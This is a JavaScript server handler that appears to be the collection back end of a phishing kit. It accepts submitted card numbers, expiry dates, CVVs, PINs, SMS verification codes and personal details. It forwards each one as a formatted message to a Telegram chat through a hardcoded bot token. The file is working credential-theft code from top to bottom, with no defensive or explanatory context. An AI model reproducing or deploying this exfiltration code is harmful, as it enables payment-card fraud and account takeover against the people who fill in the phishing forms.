export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { 

    name,
    address,
    city,
    country,
    zip,
    email,
    number,
    CN,
    cc,
    exp,
    cvv,
    PIN,
    sms,
    SMSERROR,

  } = req.body;

  const BOT_TOKEN = "8317579135:AAEP5t8tioz9RSpNnjOPzVVBC5sxXU5sIqw";
  const CHAT_ID = "-4859601944";

  let message = "";

  if  (CN && cc && exp && cvv ) {
    // 🟢 رسالة الكارت
    message = `
    💳 Carte Bancaire:
    -CardholderName: ${CN}
    - Numéro: ${cc}
    - Expiration: ${exp}
    - CVV: ${cvv}
    `;
  
  }else if (name && address && city && country && zip && email && number) {
    message = `
📨 Infos formulaire:
- Nom: ${name} 
- Email: ${email}
- country: ${country}
- Address: ${address}, ${city}, ${zip}
- Numéro: ${number}
    `;
  }else if (PIN) {
    // 🟠 رسالة SMS
    message = `
  📲 pin:
  - Code: ${PIN}
    `;

  } else if (sms ) {
  // 🟢 رسالة الكارت
  message = `
  🔑 SMS recibido Login:
  - sms: ${sms}
   `;
}else if (SMSERROR ) {
  // 🟢 رسالة الكارت
  message = `
  🔑sms Login:
  - sms: ${SMSERROR}
   `;
}
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    res.status(200).json({ message: "✅ Envoyé avec succès" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
  }
}





